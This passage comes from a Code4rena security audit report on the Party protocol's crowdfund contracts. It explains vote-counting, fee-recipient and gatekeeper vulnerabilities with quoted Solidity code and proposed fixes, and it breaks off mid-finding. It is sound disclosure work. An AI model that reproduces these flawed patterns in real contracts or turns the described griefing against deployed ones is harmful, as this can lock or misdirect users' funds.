class=\"grvsc-source\">totalVotingPower=200</span></span></code></pre>\n<p>Let’s say 80% of votes are necessary for the proposal to pass.</p>\n<p>Now the <code>totalVotingPower</code> is increased (e.g. by a <code>ReraiseETHCrowdfund</code>) since David now has 100 Votes:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Alice: 100 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Bob: 50 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Chris: 50 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">David: 100 Votes </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">totalVotingPower=300</span></span></code></pre>\n<p>Now it is impossible for the proposal to pass.</p>\n<p>The proposal needs 80% of 300 Votes which is 240 Votes. But the votes are used from the old snapshot and there were only 200 Votes.</p>\n<p>The old <code>totalVotingPower</code> should have been used (200 Votes instead of 300 Votes).</p>\n<p>Similarly there is an issue when <code>totalVotingPower</code> decreases:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Alice: 100 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Bob: 50 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Chris: 0 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">totalVotingPower=150</span></span></code></pre>\n<p>If 60% of the votes are necessary for the proposal to pass, Alice can make the proposal pass on her own because <code>totalVotingPower=150</code> is used even though the old <code>totalVotingPower=200</code> should be used.</p>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>As explained above the sponsor already has the code to implement snapshotting the <code>totalVotingPower</code>.</p>\n<p>In short the following changes need to be made:</p>\n<ol>\n<li>Snapshot <code>totalVotingPower</code> whenever it is changed</li>\n<li>Whenever <code>totalVotingPower</code> is used to calculate whether a proposal is accepted / vetoed, the snapshot should be used</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/9#issuecomment-1512082754\">0xble (Party) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-08-ethcrowdfundbasesol-all-funds-are-lost-when-fee-recipient-cannot-receive-eth\" style=\"position:relative;\"><a href=\"#m-08-ethcrowdfundbasesol-all-funds-are-lost-when-fee-recipient-cannot-receive-eth\" aria-label=\"m 08 ethcrowdfundbasesol all funds are lost when fee recipient cannot receive eth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/8\">[M-08] <code>ETHCrowdfundBase.sol</code>: All funds are lost when fee recipient cannot receive ETH</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/8\">HollaDieWaldfee</a></em></p>\n<p>In the <a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ETHCrowdfundBase.sol\"><code>ETHCrowdfundBase</code></a> contract a <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L142\"><code>fundingSplitRecipient</code></a> address is configured which receives a percentage of the funds in case the crowdfund is won.</p>\n<p>Neither the <code>fundingSplitRecipient</code> address nor the <code>fundingSplitBps</code> percentage can be changed.</p>\n<p>The issue is that the <code>_finalize</code> function can only succeed when the fees can be transferred to the recipient.</p>\n<p>However the recipient contract may revert when it receives ETH. This causes all ETH in the <code>ETHCrowdfundBase</code> contract to be stuck.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When the crowdfund is won the <code>finalize</code> function needs to be called which calls <code>_finalize</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273-L292\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_finalize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalContributions_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Finalize the crowdfund.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expiry</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Update the party&#39;s total voting power.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalContributions_</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">exchangeRateBps</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseTotalVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Transfer fee to recipient if applicable.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingSplitRecipient</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingSplitBps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalContributions_</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalContributions_</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferEth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Transfer ETH to the party.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">transferEth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalContributions_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Here you can see that the <code>feeAmount</code> is transferred to the <code>fundingSplitRecipient</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferEth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>If the recipient contract reverts, the ETH cannot be transferred and the crowdfund cannot be finalized.</p>\n<p>But the users can also not get a refund because the crowdfund is in the <code>Won</code> state. So there is no way to get the funds out of the contract which means they are lost. Also the users don’t get the voting power that they are supposed to get from the crowdfund.</p>\n<p>This could be used in a griefing attack where the <code>fundingSplitRecipient</code> is set such that it can be made to revert.</p>\n<p>Users that fall into this “trap” will lose all their funds. It can also just happen by mistake that a bad <code>fundingSplitRecipient</code> is set.</p>\n<h3 id=\"tools-used-7\" style=\"position:relative;\"><a href=\"#tools-used-7\" aria-label=\"tools used 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>I recommend to pay the fees in a separate function such that it is separated from the <code>_finalize</code> function.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 4392655..5f68406 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -62,6 +62,8 @@ contract ETHCrowdfundBase is Implementation {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     error BelowMinimumContributionsError(uint96 contributions, uint96 minContributions);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     error AboveMaximumContributionsError(uint96 contributions, uint96 maxContributions);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     error ContributingForExistingCardDisabledError();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    error NotFinalizedError();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    error FundingFeesAlreadyPaidError();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     event Contributed(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address indexed sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -109,6 +111,8 @@ contract ETHCrowdfundBase is Implementation {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice The address a contributor is delegating their voting power to.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping(address =&gt; address) public delegationsByContributor;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bool public fundingFeesPaid;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // Initialize storage for proxy contracts, credit initial contribution (if</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // any), and setup gatekeeper.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function _initialize(ETHCrowdfundOptions memory opts) internal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -278,7 +282,20 @@ contract ETHCrowdfundBase is Implementation {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         party.increaseTotalVotingPower(newVotingPower);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Transfer ETH to the party.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        payable(address(party)).transferEth(totalContributions_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function sendFundingFees() external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        CrowdfundLifecycle lc = getCrowdfundLifecycle();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (lc != CrowdfundLifecycle.Finalized) revert NotFinalizedError();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (fundingFeesPaid) revert FundingFeesAlreadyPaidError();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        fundingFeesPaid = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Transfer fee to recipient if applicable.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint96 totalContributions_ = totalContributions;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address payable fundingSplitRecipient_ = fundingSplitRecipient;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint16 fundingSplitBps_ = fundingSplitBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (fundingSplitRecipient_ != address(0) &amp;&amp; fundingSplitBps_ &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -286,8 +303,5 @@ contract ETHCrowdfundBase is Implementation {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             totalContributions_ -= feeAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             fundingSplitRecipient_.transferEth(feeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // Transfer ETH to the party.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        payable(address(party)).transferEth(totalContributions_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> }</span></span></span></code></pre>\n<p>Alternatively it may also be an option to just send the fees to the party in case the transfer to the recipient fails.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/8#issuecomment-1512082533\">0xble (Party) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-09-initialethcrowdfund--reraiseethcrowdfund-gatekeeper-checks-wrong-address\" style=\"position:relative;\"><a href=\"#m-09-initialethcrowdfund--reraiseethcrowdfund-gatekeeper-checks-wrong-address\" aria-label=\"m 09 initialethcrowdfund  reraiseethcrowdfund gatekeeper checks wrong address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/6\">[M-09] <code>InitialETHCrowdfund</code> + <code>ReraiseETHCrowdfund</code>: Gatekeeper checks wrong address</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/6\">HollaDieWaldfee</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L282-L293\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L282-L293</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L215-L226\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L215-L226</a></p>\n<p>This vulnerability exists in both the <a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/InitialETHCrowdfund.sol\"><code>InitialETHCrowdfund</code></a> and <a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol\"><code>ReraiseETHCrowdfund</code></a> contracts in exactly the same way.</p>\n<p>I will continue this report by explaining the issue in only one contract. The mitigation section however contains the fix for both instances.</p>\n<p>When making a contribution there is a check with the <code>gatekeeper</code> (if it is configured):</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L282-L293\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Must not be blocked by gatekeeper.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">IGateKeeper</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gateKeeper</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">IGateKeeper</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">gateKeeperId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">gateData</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotAllowedByGateKeeperError</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">gateKeeperId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">gateData</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The issue is that the first argument to the <code>isAllowed</code> function is wrong. It is <code>contributor</code> but it should be <code>msg.sender</code>.</p>\n<p>The impact of this is that it will be possible for unauthorized users to make contributions.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 